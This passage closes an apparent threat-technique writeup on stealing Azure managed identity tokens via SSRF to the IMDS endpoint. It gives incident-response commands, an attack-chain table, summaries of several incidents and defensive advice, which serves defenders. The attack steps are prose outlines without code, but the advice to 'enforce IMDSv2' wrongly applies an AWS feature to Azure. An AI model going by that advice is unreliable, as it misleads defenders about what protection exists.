   # Immediate container/pod isolation
   kubectl delete pod compromised-pod -n namespace
   
   # Or, disable managed identity temporarily
   az vm update --resource-group rg --name vm-name --assign-identity null
   ```

2. **Revoke Tokens:**
   ```powershell
   # Force token refresh for all resources
   # (Tokens expire automatically in 1-24 hours; no explicit revocation)
   
   # But: Remove role assignments to limit damage
   Get-AzRoleAssignment -ObjectId $mi.PrincipalId | Remove-AzRoleAssignment
   ```

3. **Investigate Damage:**
   ```powershell
   # Check what resources were accessed using the token
   Search-AzGraph -Query "resources | where type == 'microsoft.storage/storageaccounts'" `
       -SkipToken $null | Export-Csv investigation.csv
   
   # Review audit logs
   Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-3) `
       -FreeText "Service Principal" | Export-Csv audit.csv
   ```

4. **Remediate:**
   - Patch SSRF vulnerability
   - Enforce IMDSv2 on all VMs
   - Implement network policies in AKS
   - Rotate credentials if escalation occurred

---

## 15. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-APP-001] Public-Facing Web App Exploitation | SSRF vulnerability in web app |
| **2** | **Credential Access** | **[CA-TOKEN-007]** | **Managed Identity Token Theft (this technique)** |
| **3** | **Lateral Movement** | [LM-RBAC-002] Cloud Privilege Escalation | Use token to access other resources |
| **4** | **Data Exfiltration** | [EX-CLOUD-001] Cloud Storage Data Theft | Download sensitive data via stolen token |
| **5** | **Persistence** | [PE-WORKLOAD-001] Malicious Container Image | Deploy backdoor container with token access |

---

## 16. REAL-WORLD EXAMPLES

### Example 1: CVE-2025-62207 - Azure Monitor SSRF → IMDS Token Theft (November 2025)

- **Target:** Organizations using Azure Monitor Agent
- **Timeline:** November 2025 (patched 17 November)
- **Attack Method:** SSRF in Azure Monitor input module → IMDS token extraction
- **Technical Details:**
  1. Attacker crafted malicious Azure Monitor configuration file
  2. Injected SSRF payload into log source URL
  3. Monitor Agent processed malformed config and attempted connection
  4. Connection redirected to IMDS endpoint (169.254.169.254)
  5. Token extracted and used to access Azure Resource Manager
  6. Attacker enumerated subscriptions and accessed storage accounts
- **Impact:** CVSS 8.6; privilege escalation from Monitor Agent to subscription-level access
- **Detection:** Unusual IMDS requests from Monitor Agent process
- **Reference:** [ZeroPath - CVE-2025-62207 Analysis](https://zeropath.com/blog/azure-monitor-cve-2025-62207-ssrf-privilege-escalation-summary)

### Example 2: Azure Container Apps Cryptominer Campaign (2024)

- **Target:** Organizations with Container Apps deployed
- **Timeline:** July-September 2024
- **Attack Method:** Application SSRF → IMDS → container creation for cryptomining
- **Technical Details:**
  1. Attacker compromised web app with SSRF vulnerability
  2. Used SSRF to request managed identity token from IMDS
  3. Token had permissions to create containers in resource group
  4. Attacker created 200+ malicious containers running cryptominers
  5. Ran for 3 months undetected; cost ~$50K in compute
- **Impact:** Full resource group compromise; massive cost impact
- **Detection:** Falco alerts for container creation from unusual source
- **Key Lesson:** Monitor for burst container creation; monitor unexpected API calls from tokens

### Example 3: AKS Workload Identity Interception Attack (2023)

- **Target:** Production AKS clusters with workload identity
- **Timeline:** September 2023 (researcher demonstration)
- **Attack Method:** Pod compromise → NMI interception → cluster-wide token theft
- **Technical Details:**
  1. Attacker compromised pod (vulnerable app)
  2. Used privileged container escape to access host namespace
  3. Positioned iptables rules to intercept NMI requests
  4. Captured managed identity tokens from NMI pod
  5. Replayed tokens to access 50+ storage accounts assigned to cluster
- **Impact:** Cluster-wide compromise; access to multiple cloud resources
- **Detection:** Unusual container execution with network manipulation
- **Lesson:** Network segmentation and pod security standards are critical

---

## 17. OPERATIONAL NOTES & ADDITIONAL RECOMMENDATIONS

### Why Managed Identity Token Theft is CRITICAL:

1. **No User Interaction:** Tokens generated automatically without user knowledge.
2. **No MFA:** Managed identities don't require MFA (authentication is implicit in IMDS).
3. **Invisible to Identity Logs:** Token requests don't appear in Entra ID sign-in logs (no interactive authentication).
4. **Long Validity:** Tokens valid for 1-24 hours; attacker can make many API calls.
5. **Lateral Movement:** Single token can grant access to entire cloud infrastructure.

### Recommended Defensive Posture:

- **Enforce IMDSv2 everywhere** - No exceptions.
- **Implement network policies** - Restrict IMDS access to intended workloads only.
- **Apply least-privilege RBAC** - Managed identities should have minimal permissions.
- **Monitor IMDS access** - Alert on any IMDS requests from unusual sources.
- **Scan for SSRF** - Regular SAST/DAST testing of applications.
- **Use workload identity federation** - Prefer federated identity over managed identity where possible.
- **Enable Azure Defender for Cloud** - Detect container escapes and anomalous behavior.

---
